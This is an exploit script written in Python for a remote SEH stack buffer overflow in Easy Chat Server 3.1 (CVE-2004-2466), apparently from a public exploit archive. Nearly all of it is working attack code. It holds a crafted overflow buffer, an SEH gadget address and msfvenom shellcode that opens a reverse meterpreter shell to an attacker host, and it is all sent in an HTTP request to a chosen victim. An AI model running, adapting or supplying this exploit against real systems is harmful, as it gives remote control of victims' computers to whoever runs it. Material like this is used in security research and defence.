# Exploit Title: Easy Chat Server 3.1 - Remote Stack Buffer Overflow (SEH)
# Exploit Author: r00tpgp @ http://www.r00tpgp.com
# Usage: python easychat-exploit.py <victim-ip> <port>
# Spawns reverse meterpreter LHOST=192.168.0.162 LPORT=1990
# CVE: CVE-2004-2466
# Installer: http://www.echatserver.com/
# Tested on: Microsoft Windows 11 Pro x86-64 (10.0.22000 N/A Build 22000)

#!/usr/bin/python3

import sys
import socket
from struct import pack

host = sys.argv[1]  # Recieve IP from user
port = int(sys.argv[2])  # Recieve Port from user

junk = b"A" * 217
nseh = pack("<L", 0x06eb9090)  # short jump 6 bytes
seh = pack("<L", 0x1001ae86)  # pop pop ret 1001AE86 SSLEAY32.DLL

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.162 LPORT=1990 -f python -b "\x00\x20" -v shellcode
shellcode = b"\x90" * 16
shellcode += b"\xd9\xe5\xba\xea\x72\x6a\xf4\xd9\x74\x24\xf4"
shellcode += b"\x5f\x33\xc9\xb1\x59\x31\x57\x19\x03\x57\x19"
shellcode += b"\x83\xef\xfc\x08\x87\x96\x1c\x43\x68\x67\xdd"
shellcode += b"\x3b\xe0\x82\xec\x69\x96\xc7\x5d\xbd\xdc\x8a"
shellcode += b"\x6d\x36\xb0\x3e\xe5\x3a\x1d\x0e\x06\xb5\xea"
shellcode += b"\x3a\xde\xf8\xd4\x17\x22\x9b\xa8\x65\x77\x7b"
shellcode += b"\x90\xa5\x8a\x7a\xd5\x73\xe0\x93\x8b\x08\x58"
shellcode += b"\x7b\x7b\x84\x1f\x47\x82\x4a\x14\xf7\xfc\xef"
shellcode += b"\xeb\x83\xb0\xee\x3b\xe0\x01\xe9\xeb\x7d\xc9"
shellcode += b"\x29\x0d\x52\x6f\xe0\x79\x68\x39\x78\xb5\x1b"
shellcode += b"\xb8\xa8\x87\xe4\x8a\x94\x44\xdb\x22\x19\x94"
shellcode += b"\x1c\x84\xc2\xe3\x56\xf6\x7f\xf4\xad\x84\x5b"
shellcode += b"\x71\x31\x2e\x2f\x21\x95\xce\xfc\xb4\x5e\xdc"
shellcode += b"\x49\xb2\x38\xc1\x4c\x17\x33\xfd\xc5\x96\x93"
shellcode += b"\x77\x9d\xbc\x37\xd3\x45\xdc\x6e\xb9\x28\xe1"
shellcode += b"\x70\x65\x94\x47\xfb\x84\xc3\xf8\x04\x57\xec"
shellcode += b"\xa4\x92\x9b\x21\x57\x62\xb4\x32\x24\x50\x1b"
shellcode += b"\xe9\xa2\xd8\xd4\x37\x34\x69\xf2\xc7\xea\xd1"
shellcode += b"\x93\x39\x0b\x21\xbd\xfd\x5f\x71\xd5\xd4\xdf"
shellcode += b"\x1a\x25\xd8\x35\xb6\x2f\x4e\x76\xee\x1d\x55"
shellcode += b"\x1e\xec\x5d\x73\xd5\x79\xbb\xd3\xb9\x29\x14"
shellcode += b"\x94\x69\x89\xc4\x7c\x60\x06\x3a\x9c\x8b\xcd"
shellcode += b"\x53\x37\x64\xbb\x0c\xa0\x1d\xe6\xc7\x51\xe1"
shellcode += b"\x3d\xa2\x52\x69\xb7\x52\x1c\x9a\xb2\x40\x49"
shellcode += b"\xfd\x3c\x99\x8a\x68\x3c\xf3\x8e\x3a\x6b\x6b"
shellcode += b"\x8d\x1b\x5b\x34\x6e\x4e\xd8\x33\x90\x0f\xe8"
shellcode += b"\x48\xa7\x85\x54\x27\xc8\x49\x54\xb7\x9e\x03"
shellcode += b"\x54\xdf\x46\x70\x07\xfa\x88\xad\x34\x57\x1d"
shellcode += b"\x4e\x6c\x0b\xb6\x26\x92\x72\xf0\xe8\x6d\x51"
shellcode += b"\x82\xef\x91\x27\xad\x57\xf9\xd7\xed\x67\xf9"
shellcode += b"\xbd\xed\x37\x91\x4a\xc1\xb8\x51\xb2\xc8\x90"
shellcode += b"\xf9\x39\x9d\x53\x98\x3e\xb4\x32\x04\x3e\x3b"
shellcode += b"\xef\xb7\x45\x34\x10\x38\xba\x5c\x75\x39\xba"
shellcode += b"\x60\x8b\x06\x6c\x59\xf9\x49\xac\xde\xf2\xfc"
shellcode += b"\x91\x77\x99\xfe\x86\x88\x88"

buffer = b"GET /chat.ghp?username=" + junk + nseh + seh + shellcode + b"&password=&room=1&sex=1 HTTP/1.1\r\n"
buffer += b"User-Agent: Mozilla/4.0\r\n"
buffer += b"Host: 192.168.170.213:20000\r\n"
buffer += b"Accept-Language: en-us\r\n"
buffer += b"Accept-Encoding: gzip, deflate\r\n"
buffer += b"Referer: http://192.168.170.213\r\n"
buffer += b"Connection: Keep-Alive\r\n\r\n"

print("[*] Sending evil buffer...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buffer)
s.close()
print("[+] Done!")